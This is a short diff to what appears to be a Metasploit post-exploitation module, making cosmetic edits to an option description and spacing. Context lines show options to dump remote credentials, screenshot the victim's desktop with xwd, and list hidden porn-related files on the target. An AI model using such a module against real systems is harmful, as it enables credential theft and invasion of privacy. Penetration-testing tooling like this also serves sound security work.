@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('SCREEN_CAPTURE', [false, 'Take a screenshot of remote desktop?', false]),
+                                OptBool.new('SCREEN_CAPTURE', [false, 'Take one screenshot of remote desktop?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
                                 OptBool.new('THE_FAPENNING', [false, 'list hidden folders/pics/vids porn related?', false]),
@@ -565,7 +565,7 @@ def run
        cmd_exec("xwd -root -out /tmp/ScreenShot.xwd")
        Rex::sleep(1)
          # make sure that file was build
-         path="/tmp/ScreenShot.xwd"
+         path = "/tmp/ScreenShot.xwd"
          if not session.fs.file.exist?(path)
            print_error("module can not create ScreenShot.xwd in /tmp remote folder")
            return nil
